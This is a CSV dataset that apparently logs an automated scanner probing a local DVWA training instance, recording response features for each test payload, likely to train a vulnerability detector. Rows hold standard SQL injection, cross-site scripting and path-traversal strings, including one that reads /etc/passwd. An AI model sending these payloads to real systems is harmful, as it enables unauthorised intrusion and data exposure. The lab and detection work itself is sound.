page_url,request_url,form_method,payload_type,payload,resp_length_base,status_code_base,resp_time_base,has_sql_error_base,has_script_tag_base,resp_length_probe,status_code_probe,resp_time_probe,has_sql_error_probe,has_script_tag_probe,len_diff,status_changed,resp_time_diff,has_text_diff,probe_reflected,label
http://127.0.0.1/dvwa/setup.php,http://127.0.0.1/dvwa/setup.php,POST,sqli,test' OR '1'='1,5836,200,0.013212203979492188,1,1,5738,200,0.007603168487548828,1,1,98,0,-0.005609035491943359,1,0,
http://127.0.0.1/dvwa/setup.php,http://127.0.0.1/dvwa/setup.php,POST,sqli,' OR 1=1 -- ,5836,200,0.013212203979492188,1,1,5738,200,0.007031679153442383,1,1,98,0,-0.006180524826049805,1,0,
http://127.0.0.1/dvwa/setup.php,http://127.0.0.1/dvwa/setup.php,POST,sqli,""" OR """"=""""",5836,200,0.013212203979492188,1,1,5738,200,0.008032798767089844,1,1,98,0,-0.005179405212402344,1,0,
http://127.0.0.1/dvwa/setup.php,http://127.0.0.1/dvwa/setup.php,POST,xss,<script>alert(1)</script>,5836,200,0.013212203979492188,1,1,5738,200,0.006760597229003906,1,1,98,0,-0.006451606750488281,1,0,
http://127.0.0.1/dvwa/setup.php,http://127.0.0.1/dvwa/setup.php,POST,xss,<img src=1 onerror=alert(1)>,5836,200,0.013212203979492188,1,1,5738,200,0.00977778434753418,1,1,98,0,-0.003434419631958008,1,0,
http://127.0.0.1/dvwa/setup.php,http://127.0.0.1/dvwa/setup.php,POST,lfi,../../../../etc/passwd,5836,200,0.013212203979492188,1,1,5738,200,0.008725881576538086,1,1,98,0,-0.0044863224029541016,1,0,
http://127.0.0.1/dvwa/vulnerabilities/brute/,http://127.0.0.1/dvwa/vulnerabilities/brute/,GET,sqli,test' OR '1'='1,4259,200,0.0019562244415283203,1,1,4259,200,0.0020301342010498047,1,1,0,0,7.390975952148438e-05,0,0,
http://127.0.0.1/dvwa/vulnerabilities/brute/,http://127.0.0.1/dvwa/vulnerabilities/brute/,GET,sqli,' OR 1=1 -- ,4259,200,0.0019562244415283203,1,1,4259,200,0.0015921592712402344,1,1,0,0,-0.00036406517028808594,0,0,
http://127.0.0.1/dvwa/vulnerabilities/brute/,http://127.0.0.1/dvwa/vulnerabilities/brute/,GET,sqli,""" OR """"=""""",4259,200,0.0019562244415283203,1,1,4259,200,0.0016994476318359375,1,1,0,0,-0.0002567768096923828,0,0,
http://127.0.0.1/dvwa/vulnerabilities/brute/,http://127.0.0.1/dvwa/vulnerabilities/brute/,GET,xss,<script>alert(1)</script>,4259,200,0.0019562244415283203,1,1,4259,200,0.002007007598876953,1,1,0,0,5.078315734863281e-05,0,0,
http://127.0.0.1/dvwa/vulnerabilities/brute/,http://127.0.0.1/dvwa/vulnerabilities/brute/,GET,xss,<img src=1 onerror=alert(1)>,4259,200,0.0019562244415283203,1,1,4259,200,0.0016984939575195312,1,1,0,0,-0.00025773048400878906,0,0,
http://127.0.0.1/dvwa/vulnerabilities/brute/,http://127.0.0.1/dvwa/vulnerabilities/brute/,GET,lfi,../../../../etc/passwd,4259,200,0.0019562244415283203,1,1,4259,200,0.0023822784423828125,1,1,0,0,0.0004260540008544922,0,0,
